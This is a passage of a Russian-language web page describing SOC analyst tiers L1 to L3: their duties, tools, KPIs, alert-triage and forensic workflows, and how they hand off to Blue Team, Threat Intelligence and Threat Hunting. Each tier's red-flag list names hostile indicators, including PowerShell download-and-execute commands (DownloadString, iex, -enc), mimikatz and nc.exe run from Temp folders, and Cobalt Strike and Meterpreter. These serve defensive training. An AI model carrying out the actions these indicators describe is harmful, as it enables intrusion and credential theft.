            <button class="accordion-header">Уровень 1 (L1) — Первичный мониторинг и эскалация</button>
            <div class="accordion-content">
              <div class="osi-table-container">
                <table class="osi-table">
                  <thead>
                    <tr>
                      <th>Аспект</th>
                      <th>Описание</th>
                      <th>Инструменты</th>
                      <th>Обязанности</th>
                      <th>Требования и навыки</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr>
                      <td>Функции</td>
                      <td>Первичный мониторинг событий безопасности, классификация инцидентов, эскалация подозрительных событий на L2. Обработка базовых инцидентов (уровень 4–5).</td>
                      <td>Splunk, Zabbix, Snort, Graylog</td>
                      <td>Мониторинг дашбордов SIEM, проверка алертов, выполнение стандартных процедур (например, сброс пароля), ведение тикетов в ITSM (ServiceNow).</td>
                      <td>Базовые знания сетей (TCP/IP, DNS), понимание логов, работа с SIEM. Опыт в ИТ (0–1 год). Сертификаты: CompTIA Security+, Cisco CyberOps Associate.</td>
                    </tr>
                    <tr>
                      <td>Пример задачи</td>
                      <td>Обнаружение аномального трафика (Splunk: >500 запросов/мин с одного IP). Классификация как уровень 4, эскалация на L2.</td>
                      <td>Splunk, ServiceNow</td>
                      <td>Создание тикета, уведомление L2, документирование события.</td>
                      <td>Навыки работы с ITSM, базовый анализ логов.</td>
                    </tr>
                    <tr>
                      <td>KPI</td>
                      <td>Время обработки алерта: <10 минут. Процент корректной эскалации: >95%. Количество обработанных тикетов: >50 в смену.</td>
                      <td>ServiceNow, Splunk (отчеты)</td>
                      <td>Своевременное выполнение процедур, минимизация ложных срабатываний.</td>
                      <td>Внимательность, скорость реакции.</td>
                    </tr>
                    <tr>
                      <td>Взаимодействие</td>
                      <td>Эскалация инцидентов на L2, получение инструкций от L2/L3, обратная связь от Blue Team.</td>
                      <td>Confluence, Slack, ServiceNow</td>
                      <td>Передача тикетов с полной информацией (логи, временные метки).</td>
                      <td>Коммуникабельность, умение работать в команде.</td>
                    </tr>
                  </tbody>
                </table>
              </div>
              <h3>Процесс реагирования на алерты в SIEM для L1</h3>
              <p>Работа SOC-аналитика L1 включает мониторинг событий в SIEM (например, RUSIEM, Splunk) и выполнение базовых действий при обнаружении алертов. Вот пошаговый процесс:</p>
              <ol>
                <li><strong>Проверка алерта:</strong>
                  <ul>
                    <li>Проверяйте новые алерты в SIEM каждые 10 минут.</li>
                    <li>Ознакомьтесь с описанием алерта, чтобы понять, что произошло (например, сработало правило корреляции).</li>
                    <li>Определите тип инцидента: подозрительный вход, запуск вредоносного ПО, фишинг, утечка данных и т.д.</li>
                  </ul>
                </li>
                <li><strong>Анализ контекста:</strong>
                  <ul>
                    <li>Кто пользователь? (Имя, роль, тип учетной записи)</li>
                    <li>С какого IP-адреса произошло событие? (Проверьте геолокацию, репутацию через VirusTotal или AbuseIPDB)</li>
                    <li>Какой процесс или приложение задействованы? (Например, chrome.exe, powershell.exe)</li>
                    <li>В какое время произошло событие? (Рабочее/нерабочее время)</li>
                    <li>Есть ли артефакты? (Логи процессов, файлы, сетевые соединения)</li>
                    <li>Были ли похожие события ранее? (Проверьте историю в SIEM)</li>
                  </ul>
                </li>
                <li><strong>Проверка индикаторов компрометации (IOC):</strong>
                  <ul>
                    <li>IP-адрес: Используйте VirusTotal, AbuseIPDB для проверки репутации.</li>
                    <li>Хэш файлов: Проверьте через VirusTotal, HybridAnalysis.</li>
                    <li>Домен: Проверьте через WhoIs, репутационные сервисы.</li>
                  </ul>
                </li>
                <li><strong>Принятие решения:</strong>
                  <ul>
                    <li><strong>Ложное срабатывание:</strong> Если событие не представляет угрозы (например, легитимный вход сотрудника), закройте алерт в SIEM (если это разрешено политикой).</li>
                    <li><strong>Подозрительное событие:</strong> Эскалируйте на L2 через тикет в ITSM (например, ServiceNow), указав все собранные данные (логи, IOC, контекст).</li>
                    <li><strong>Очевидная угроза:</strong> Немедленно эскалируйте на L2, уведомите по Slack или другим каналам связи, указанным в процедурах. Если политика позволяет, выполните изоляцию (например, блокировка IP через брандмауэр).</li>
                  </ul>
                </li>
                <li><strong>Документирование:</strong>
                  <ul>
                    <li>Создайте тикет в ITSM с подробным описанием: что обнаружено, какие проверки проведены, выводы.</li>
                    <li>Пример записи: “Alert ‘Possible C2 Traffic’ — пользователь user1, процесс chrome.exe, IP 185.125.190.17 (Россия), поведение нехарактерное, эскалировано на L2”.</li>
                    <li>Убедитесь, что тикет содержит временные метки, логи и IOC.</li>
                  </ul>
                </li>
              </ol>
              <h3>Красные флаги (немедленная эскалация):</h3>
              <ul>
                <li>Успешный вход с IP из TOR, VPN или другой страны.</li>
                <li>Запуск powershell.exe с командами Invoke-WebRequest или iex.</li>
                <li>Создание новых учетных записей с правами администратора.</li>
                <li>Доступ к критическим системам в нерабочее время.</li>
                <li>Массовая рассылка писем или запуск EXE из папки AppData\\Temp.</li>
              </ul>
              <h3>Рекомендации для L1:</h3>
              <ul>
                <li>Изучи структуру алертов в SIEM: какие типы событий существуют и как они отображаются.</li>
                <li>Ознакомьтесь с сетевой топологией компании и критическими системами.</li>
                <li>Создайте шпаргалку с типичными IOC (IP, хэши, домены) и угрозами.</li>
                <li>Не бойтесь эскалировать: лучше перестраховаться, чем пропустить угрозу.</li>
                <li>Узнайте, где хранятся полные логи, так как SIEM может показывать только часть данных.</li>
                <li>Регулярно проходите тренинги от L2/L3 для повышения навыков.</li>
              </ul>
            </div>
          </div>
          <!-- L2 Accordion -->
          <div class="accordion-item">
            <button class="accordion-header">Уровень 2 (L2) — Анализ и реагирование</button>
            <div class="accordion-content">
              <div class="osi-table-container">
                <table class="osi-table">
                  <thead>
                    <tr>
                      <th>Аспект</th>
                      <th>Описание</th>
                      <th>Инструменты</th>
                      <th>Обязанности</th>
                      <th>Требования и навыки</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr>
                      <td>Функции</td>
                      <td>Глубокий анализ эскалированных инцидентов (уровень 2–3), корреляция событий, первичный форензик, реагирование на угрозы, разработка временных мер защиты.</td>
                      <td>Splunk, Wireshark, Zeek, SOAR (Demisto), Volatility, MISP, EDR (CrowdStrike, SentinelOne)</td>
                      <td>Анализ логов и трафика, подтверждение угроз, изоляция (блокировка IP, карантин хоста), разработка правил SIEM, координация с Blue Team.</td>
                      <td>Углубленные знания сетей (TCP/IP, HTTP, DNS), опыт работы с SIEM/SOAR (1–3 года), понимание MITRE ATT&CK. Сертификаты: CEH, Cisco CyberOps Professional, GIAC GCIH, HTB CPTS.</td>
                    </tr>
                    <tr>
                      <td>Пример задачи</td>
                      <td>Анализ инцидента уровня 2 (подозрение на PowerShell-атаку). Подтверждение через декодирование Base64, анализ трафика (Wireshark), блокировка C2-сервера, создание правила SIEM.</td>
                      <td>Wireshark, Splunk, Volatility, MISP, EDR</td>
                      <td>Проведение RCA, изоляция угрозы, передача данных Blue Team, обновление сигнатур (Snort, YARA).</td>
                      <td>Навыки анализа трафика, форензики, работы с IOC, автоматизации (Python, Bash).</td>
                    </tr>
                    <tr>
                      <td>KPI</td>
                      <td>Время реагирования: <30 минут для уровня 2. Процент нейтрализованных угроз: >90%. Частота обновления правил: еженедельно.</td>
                      <td>Splunk, SOAR (отчеты), ServiceNow</td>
                      <td>Эффективное устранение угроз, минимизация эскалаций на L3, точность корреляции событий.</td>
                      <td>Аналитическое мышление, стрессоустойчивость, внимание к деталям.</td>
                    </tr>
                    <tr>
                      <td>Взаимодействие</td>
                      <td>Получение тикетов от L1, эскалация сложных случаев (уровень 1) на L3, координация с Blue Team, Threat Intelligence и Threat Hunting.</td>
                      <td>MISP, Confluence, Slack, ServiceNow</td>
                      <td>Четкое документирование (RCA, IOC), обмен данными с Threat Intelligence, передача рекомендаций Blue Team.</td>
                      <td>Навыки технической коммуникации, координации, работы в команде.</td>
                    </tr>
                  </tbody>
                </table>
              </div>
              <h3>Процесс анализа и реагирования для L2</h3>
              <p>Работа SOC-аналитика L2 начинается с анализа тикетов от L1, требующих углубленного расследования. L2 подтверждает угрозы, выполняет первичный форензик и координирует реагирование. Вот пошаговый процесс:</p>
              <ol>
                <li><strong>Получение и анализ тикета:</strong>
                  <ul>
                    <li>Изучить тикет в ITSM (ServiceNow): тип инцидента, логи, IOC, контекст от L1.</li>
                    <li>Пример: “Suspicious PowerShell Execution, user1, IP 185.125.190.17, Base64-скрипт”.</li>
                    <li>Определить: ложное срабатывание, единичный инцидент или часть атаки (kill chain).</li>
                  </ul>
                </li>
                <li><strong>Сбор и корреляция данных:</strong>
                  <ul>
                    <li>Логи: Sysmon, Windows Event Logs (Security.evtx, PowerShell), EDR (CrowdStrike).</li>
                    <li>Сеть: Анализ трафика (Wireshark, Zeek), проверка NetFlow, PCAP.</li>
                    <li>Артефакты: Извлечение хэшей, файлов, дампов памяти (Volatility).</li>
                    <li>Корреляция: Связь событий (например, логин → запуск процесса → C2-трафик).</li>
                  </ul>
                </li>
                <li><strong>Проверка IOC и Threat Intelligence:</strong>
                  <ul>
                    <li>IP/домены: VirusTotal, AbuseIPDB, Greynoise, OTX AlienVault.</li>
                    <li>Хэши: VirusTotal, HybridAnalysis, Any.Run.</li>
                    <li>Запрос TTP/IOC у Threat Intelligence через MISP (например, тактики APT28).</li>
                    <li>Сопоставление с MITRE ATT&CK (Execution, Command and Control).</li>
                  </ul>
                </li>
                <li><strong>Первичный форензик и триаж:</strong>
                  <ul>
                    <li>Анализ памяти: Volatility (psscan, dlllist, cmdline).</li>
                    <li>Анализ файлов: PEStudio, Ghidra (для подозрительных EXE/DLL).</li>
                    <li>Timeline: Построение хронологии событий (Sysmon, EDR).</li>
                    <li>Пример: Декодировать Base64-скрипт, выявить C2-сервер, найти следы lateral movement.</li>
                  </ul>
                </li>
                <li><strong>Реагирование (если разрешено):</strong>
                  <ul>
                    <li>Изоляция: Блокировка IP (pfSense), карантин хоста (EDR).</li>
                    <li>Удаление: Устранение артефактов (через EDR или вручную).</li>
                    <li>Рекомендации Blue Team: Обновление WAF, патчинг, новые правила Snort.</li>
                  </ul>
                </li>
                <li><strong>Эскалация или закрытие:</strong>
                  <ul>
                    <li><strong>Ложное срабатывание:</strong> Закрыть тикет, задокументировать причину.</li>
                    <li><strong>Подтвержденная угроза:</strong> Реализовать меры, передать Blue Team рекомендации через Confluence.</li>
                    <li><strong>Сложный инцидент (уровень 1):</strong> Эскалировать на L3 через ServiceNow с RCA, IOC, дампами памяти.</li>
                  </ul>
                </li>
                <li><strong>Документирование и улучшение:</strong>
                  <ul>
                    <li>Создать отчет: хронология, MITRE ATT&CK техники, действия, выводы.</li>
                    <li>Пример: “PowerShell-атака, T1059.001, C2-сервер 185.125.190.17, заблокирован, правило SIEM обновлено”.</li>
                    <li>Разработать/обновить правило корреляции (Sigma, Splunk query).</li>
                  </ul>
                </li>
              </ol>
              <h3>Красные флаги (немедленное реагирование/эскалация):</h3>
              <ul>
                <li>Запуск процессов из %AppData% или %Temp% (mimikatz.exe, nc.exe).</li>
                <li>Трафик на C2-серверы (TOR, известные IP из Threat Intel).</li>
                <li>PowerShell с командами DownloadString, Invoke-WebRequest, -enc.</li>
                <li>Lateral movement: NetBIOS, RDP, WMI между хостами.</li>
                <li>Изменение реестра (Run keys, persistence).</li>
              </ul>
              <h3>Рекомендации для L2:</h3>
              <ul>
                <li>Освой MITRE ATT&CK: понимание техник ускоряет анализ.</li>
                <li>Автоматизируй рутину: пиши скрипты (Python, Bash) для парсинга логов.</li>
                <li>Изучи Wireshark фильтры: http.request, dns.query, tcp.stream.</li>
                <li>Создай шпаргалку: типичные IOC, команды Volatility, Sigma-шаблоны.</li>
                <li>Участвуй в CTF и Threat Hunting-тренингах (HTB, TryHackMe).</li>
                <li>Следи за отчётами Mandiant, DFIR Report, SANS для свежих TTP.</li>
              </ul>
            </div>
          </div>
          <!-- L3 Accordion -->
          <div class="accordion-item">
            <button class="accordion-header">Уровень 3 (L3) — Экспертный анализ и стратегия</button>
            <div class="accordion-content">
              <div class="osi-table-container">
                <table class="osi-table">
                  <thead>
                    <tr>
                      <th>Аспект</th>
                      <th>Описание</th>
                      <th>Инструменты</th>
                      <th>Обязанности</th>
                      <th>Требования и навыки</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr>
                      <td>Функции</td>
                      <td>Расследование сложных инцидентов (уровень 1), глубокий форензик, reverse engineering, разработка стратегических мер защиты, руководство IR, обучение L1/L2.</td>
                      <td>Volatility, Ghidra, IDA Pro, YARA, Splunk, MISP, Zeek, Caldera, EDR (CrowdStrike, SentinelOne)</td>
                      <td>Анализ APT, форензика (память, диск), разработка правил (YARA, Sigma), координация с Blue Team/Threat Intelligence, отчеты для руководства.</td>
                      <td>Экспертные знания ИБ, опыт (5+ лет), понимание low-level ОС и сетей, reverse engineering. Сертификаты: CISSP, OSCP, SANS GIAC (GCFE, GREM, GSE).</td>
                    </tr>
                    <tr>
                      <td>Пример задачи</td>
                      <td>Расследование APT (Cobalt Strike Beacon). Анализ дампов памяти (Volatility), декодирование C2-трафика, разработка плана устранения, обучение L2.</td>
                      <td>Volatility, Ghidra, Wireshark, MISP, Splunk</td>
                      <td>Идентификация TTP, разработка сигнатур YARA/Sigma, обновление архитектуры IDS, презентация для CISO.</td>
                      <td>Навыки форензики, reverse engineering, стратегическое мышление, лидерство.</td>
                    </tr>
                    <tr>
                      <td>KPI</td>
                      <td>Время расследования APT: <72 часа. Процент предотвращённых рецидивов: >98%. Частота обучения: ежеквартально.</td>
                      <td>Splunk, Confluence, MISP (отчеты)</td>
                      <td>Разработка эффективных стратегий, минимизация повторных атак, повышение зрелости SOC.</td>
                      <td>Лидерские качества, глубокая экспертиза, умение работать под давлением.</td>
                    </tr>
                    <tr>
                      <td>Взаимодействие</td>
                      <td>Координация с L2, работа с Threat Hunting/Intelligence, взаимодействие с Blue Team, CISO и руководством.</td>
                      <td>MISP, Confluence, Zoom, Slack</td>
                      <td>Передача стратегий Blue Team, обучение персонала, отчеты для руководства, обмен TTP с Threat Intelligence.</td>
                      <td>Навыки управления, презентации, технической и бизнес-коммуникации.</td>
                    </tr>
                  </tbody>
                </table>
              </div>
              <h3>Процесс расследования и стратегического реагирования для L3</h3>
              <p>L3 берет на себя самые сложные инциденты (уровень 1), требующие глубокого анализа, форензики и стратегических решений. L3 выступает лидером IR, координируя команды и разрабатывая долгосрочные меры защиты. Вот пошаговый процесс:</p>
              <ol>
                <li><strong>Получение и приоритизация инцидента:</strong>
                  <ul>
                    <li>Получить тикет от L2 через ServiceNow с данными анализа (логи, IOC, RCA).</li>
                    <li>Пример: “Подозрение на Cobalt Strike, user1, C2-трафик, дампы памяти приложены”.</li>
                    <li>Оценить критичность: APT, ransomware, data breach, insider threat.</li>
                  </ul>
                </li>
                <li><strong>Глубокий форензик и анализ:</strong>
                  <ul>
                    <li>Память: Volatility (psscan, dlllist, malfind, cmdline) для выявления инъекций, shellcode.</li>
                    <li>Диск: Анализ файловой системы (Autopsy, FTK Imager), восстановление удаленных артефактов.</li>
                    <li>Сеть: Декодирование C2-трафика (Wireshark, Zeek), анализ DNS-туннелирования.</li>
                    <li>Reverse engineering: Разбор вредоноса (Ghidra, IDA Pro), изучение PE-структуры, shellcode.</li>
                    <li>Timeline: Построение полной хронологии атаки (Sysmon, EDR, Zeek).</li>
                  </ul>
                </li>
                <li><strong>Определение root cause и TTP:</strong>
                  <ul>
                    <li>Выявить initial access: фишинг, RCE, stolen credentials.</li>
                    <li>Карта атаки: Lateral movement, privilege escalation, persistence (MITRE ATT&CK).</li>
                    <li>Атрибуция: Сопоставление TTP с группами (APT29, Lazarus) через MISP/Threat Intelligence.</li>
                  </ul>
                </li>
                <li><strong>Реагирование и containment:</strong>
                  <ul>
                    <li>Координация с Blue Team: Изоляция сетей, патчинг, сброс учетных записей.</li>
                    <li>Удаление persistence: Устранение backdoors, Run keys, scheduled tasks.</li>
                    <li>Рекомендации: Усиление GPO, MFA, сегментация сети.</li>
                  </ul>
                </li>
                <li><strong>Разработка detection и prevention:</strong>
                  <ul>
                    <li>Создание правил: YARA (для вредоносов), Sigma (SIEM), Suricata (IDS).</li>
                    <li>Тестирование: Atomic Red Team, Caldera для проверки детекторов.</li>
                    <li>Обновление архитектуры: Новая IDS/IPS, улучшение EDR-политик.</li>
                  </ul>
                </li>
                <li><strong>Документирование и отчетность:</strong>
                  <ul>
                    <li>Отчет: Хронология, TTP, ущерб, MITRE ATT&CK, рекомендации.</li>
                    <li>Пример: “APT41, T1071.004, C2 через DNS, устранено, YARA/Sigma внедрены”.</li>
                    <li>Презентация для CISO/руководства: Ущерб, меры, бюджет на улучшения.</li>
                  </ul>
                </li>
                <li><strong>Обучение и улучшение:</strong>
                  <ul>
                    <li>Проведение тренингов для L1/L2: Новые TTP, уроки из инцидента.</li>
                    <li>Обновление playbook: Уточнение процедур IR, Threat Hunting.</li>
                    <li>Post-mortem: Lessons learned, улучшение SOC-зрелости.</li>
                  </ul>
                </li>
              </ol>
              <h3>Красные флаги (немедленное реагирование):</h3>
              <ul>
                <li>Обнаружение Beacon (Cobalt Strike), Meterpreter, или кастомного malware.</li>
                <li>DNS-туннелирование, DGA (domain generation algorithm) трафик.</li>
                <li>Инъекции в lsass.exe, explorer.exe, или svchost.exe.</li>
                <li>Необъяснимые учетные записи с правами администратора.</li>
                <li>Шифрование файлов или запуск wiper (ransomware-like поведение).</li>
              </ul>
              <h3>Рекомендации для L3:</h3>
              <ul>
                <li>Изучи MITRE ATT&CK и PRE-ATT&CK на уровне эксперта.</li>
                <li>Освой reverse engineering: Ghidra, IDA Pro, x64dbg.</li>
                <li>Автоматизируй анализ: Python (pefile, volatility), Bash, PowerShell.</li>
                <li>Создай личный TI-репозиторий: IOC, TTP, скрипты для парсинга.</li>
                <li>Участвуй в Red Team/Blue Team симуляциях (Caldera, Cobalt Strike).</li>
                <li>Читай отчёты: Mandiant M-Trends, CrowdStrike Global Threat Report, SANS.</li>
                <li>Развивай лидерские навыки: IR-координация, работа с C-level.</li>
              </ul>
            </div>
          </div>
        </div>

        <h2>Схема взаимодействия уровней SOC</h2>
        <div class="stego-method">
          <div class="stego-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
            <div class="soc-interaction-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
              <h3>L1: Мониторинг</h3>
              <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
                <div style="background-color: #8e24aa; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Мониторинг событий
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Использование SIEM</p>
                </div>
                <div style="background-color: #ab47bc; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Классификация
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Уровень 4–5</p>
                </div>
                <div style="background-color: #ce93d8; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Эскалация
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Передача на L2</p>
                </div>
              </div>
            </div>
            <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
            <div style="flex: 1; padding: 15px;">
              <h3>L1: Мониторинг</h3>
              <p><strong>Взаимодействие и эскалация:</strong> L1 выполняет первичный мониторинг через SIEM (Splunk) и системы мониторинга (Zabbix). При обнаружении аномалии (например, >500 запросов/мин с одного IP) L1 классифицирует инцидент как уровень 4 и создает тикет в ServiceNow, добавляя логи и временные метки. Тикет автоматически эскалируется на L2 для дальнейшего анализа. L1 ожидает инструкций от L2 или L3 через ServiceNow или Slack, если требуется уточнение. После реализации мер Blue Team передает L1 обратную связь через Confluence для корректировки мониторинга.</p>
              <p><strong>Ключевые моменты:</strong> L1 не взаимодействует напрямую с Threat Intelligence или Threat Hunting, но может получать обновленные правила мониторинга от L2, основанные на данных Threat Intelligence.</p>
            </div>
          </div>
        </div>

        <div class="stego-method">
          <div class="stego-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
            <div class="soc-interaction-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
              <h3>L2: Анализ</h3>
              <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
                <div style="background-color: #8e24aa; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Анализ логов
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Использование Wireshark</p>
                </div>
                <div style="background-color: #ab47bc; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Реагирование
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Блокировка угроз</p>
                </div>
                <div style="background-color: #ce93d8; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Эскалация
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Передача на L3</p>
                </div>
              </div>
            </div>
            <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
            <div style="flex: 1; padding: 15px;">
              <h3>L2: Анализ</h3>
              <p><strong>Взаимодействие и эскалация:</strong> L2 получает тикет от L1 через ServiceNow с данными об инциденте (например, подозрение на SMB-эксплойт). Аналитики L2 используют Wireshark и Splunk для анализа трафика и логов, подтверждают угрозу и блокируют IP через pfSense. L2 запрашивает IOC у Threat Intelligence через MISP для подтверждения угрозы. Если инцидент классифицируется как уровень 1 (например, APT), L2 эскалирует его на L3 через ServiceNow, передавая данные анализа и IOC. L2 также передает рекомендации Blue Team (например, обновление WAF) через Confluence и получает от них обратную связь об эффективности мер. L2 может получать уточняющие инструкции от L3 через Slack.</p>
              <p><strong>Ключевые моменты:</strong> L2 активно взаимодействует с Threat Intelligence для обогащения данных и с Blue Team для оперативного реагирования, минимизируя эскалацию на L3.</p>
            </div>
          </div>
        </div>

        <div class="stego-method">
          <div class="stego-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
            <div class="soc-interaction-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
              <h3>L3: Стратегия</h3>
              <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
                <div style="background-color: #8e24aa; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Расследование APT
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Анализ дампов</p>
                </div>
                <div style="background-color: #ab47bc; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Разработка мер
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Новая архитектура</p>
                </div>
                <div style="background-color: #ce93d8; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Обучение
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">L1/L2</p>
                </div>
              </div>
            </div>
            <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
            <div style="flex: 1; padding: 15px;">
              <h3>L3: Стратегия</h3>
              <p><strong>Взаимодействие и эскалация:</strong> L3 получает эскалированные инциденты уровня 1 от L2 через ServiceNow (например, APT с RAT). L3 запрашивает TTP и дополнительные IOC у Threat Intelligence через MISP, проводит глубокий анализ с помощью Volatility и разрабатывает долгосрочные меры (например, новая архитектура IDS). Стратегии передаются Blue Team через Confluence для реализации, а L3 предоставляет L1 и L2 обучающие материалы через Confluence или очные тренинги. L3 также готовит отчеты для руководства, согласовывая стратегии через Zoom, и координирует с Threat Hunting совместный анализ сложных угроз.</p>
              <p><strong>Ключевые моменты:</strong> L3 не получает задачи напрямую от L1, но может отправлять уточняющие запросы L2 через Slack, если данные недостаточны.</p>
            </div>
          </div>
        </div>

        <div class="stego-method">
          <div class="stego-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
            <div class="soc-interaction-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
              <h3>Blue Team</h3>
              <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
                <div style="background-color: #8e24aa; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Получение данных
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Рекомендации</p>
                </div>
                <div style="background-color: #ab47bc; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Реализация мер
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Обновление WAF</p>
                </div>
                <div style="background-color: #ce93d8; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Обратная связь
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Эффективность</p>
                </div>
              </div>
            </div>
            <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
            <div style="flex: 1; padding: 15px;">
              <h3>Blue Team</h3>
              <p><strong>Взаимодействие и эскалация:</strong> Blue Team получает рекомендации от L2 (например, блокировка IP или обновление WAF) и долгосрочные стратегии от L3 (например, новая архитектура IDS) через Confluence. После внедрения мер (например, обновление правил Snort) Blue Team тестирует их эффективность и передает обратную связь L2 через Confluence, указывая, например, снижение ложных срабатываний. Blue Team также взаимодействует с Threat Hunting для тестирования новых мер в сценариях атак и с L1, передавая обновленные правила мониторинга через Confluence.</p>
              <p><strong>Ключевые моменты:</strong> Blue Team не инициирует эскалацию, но может запросить уточнения у L2 через Slack, если рекомендации неоднозначны.</p>
            </div>
          </div>
        </div>

        <div class="stego-method">
          <div class="stego-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
            <div class="soc-interaction-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
              <h3>Threat Intelligence</h3>
              <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
                <div style="background-color: #8e24aa; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Сбор данных
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">IOC и TTP</p>
                </div>
                <div style="background-color: #ab47bc; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Передача данных
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">L2/L3</p>
                </div>
                <div style="background-color: #ce93d8; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Анализ угроз
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Обогащение</p>
                </div>
              </div>
            </div>
            <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
            <div style="flex: 1; padding: 15px;">
              <h3>Threat Intelligence</h3>
              <p><strong>Взаимодействие и эскалация:</strong> Threat Intelligence получает запросы на IOC от L2 через MISP (например, IP или хэши, связанные с SMB-эксплойтом) и предоставляет данные для анализа. Для L3 Threat Intelligence передает TTP (например, тактики APT28) через MISP, помогая в расследовании сложных угроз. Команда также обменивается данными с Threat Hunting через Confluence, предоставляя IOC для проактивного поиска угроз, и может передавать обновленные данные L2 для корректировки правил SIEM.</p>
              <p><strong>Ключевые моменты:</strong> Threat Intelligence не участвует в эскалации задач, но играет ключевую роль в обогащении данных для всех уровней SOC.</p>
            </div>
          </div>
        </div>

        <div class="stego-method">
          <div class="stego-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
            <div class="soc-interaction-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
              <h3>Threat Hunting</h3>
              <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
                <div style="background-color: #8e24aa; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Проактивный поиск
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Анализ логов</p>
                </div>
                <div style="background-color: #ab47bc; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Совместный анализ
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">С L3</p>
                </div>
                <div style="background-color: #ce93d8; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Тестирование
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">С Blue Team</p>
                </div>
              </div>
            </div>
            <div style="flex: 0 0 1px; background-color: #444; height: auto;"></div>
            <div style="flex: 1; padding: 15px;">
              <h3>Threat Hunting</h3>
              <p><strong>Взаимодействие и эскалация:</strong> Threat Hunting работает с L3, получая данные об инцидентах уровня 1 через Confluence и помогая в анализе сложных угроз (например, поиск следов APT в логах через Splunk). Если обнаруживаются новые угрозы, Threat Hunting эскалирует их L3 через Confluence, предоставляя гипотезы и данные анализа. Команда также взаимодействует с Threat Intelligence, получая IOC через MISP, и с Blue Team, передавая рекомендации по тестированию новых мер защиты через Confluence.</p>
              <p><strong>Ключевые моменты:</strong> Threat Hunting не взаимодействует напрямую с L1 или L2, но их работа косвенно влияет на мониторинг через обновления правил.</p>
            </div>
          </div>
        </div>

        <div class="stego-method">
          <div class="stego-method-container" style="display: flex; align-items: stretch; gap: 20px; margin-bottom: 20px;">
            <div class="soc-interaction-diagram" style="flex: 0 0 250px; padding: 15px; border-radius: 8px; text-align: center; background-color: #05060a;">
              <h3>Руководство</h3>
              <div style="display: flex; flex-direction: column; align-items: center; gap: 8px;">
                <div style="background-color: #8e24aa; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Получение отчетов
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">От L3</p>
                </div>
                <div style="background-color: #ab47bc; padding: 8px; border-radius: 5px; width: 200px; white-space: normal; word-wrap: break-word;">
                  Согласование
                  <p style="font-size: 12px; margin: 5px 0 0; color: #fff;">Стратегии</p>
                </div>
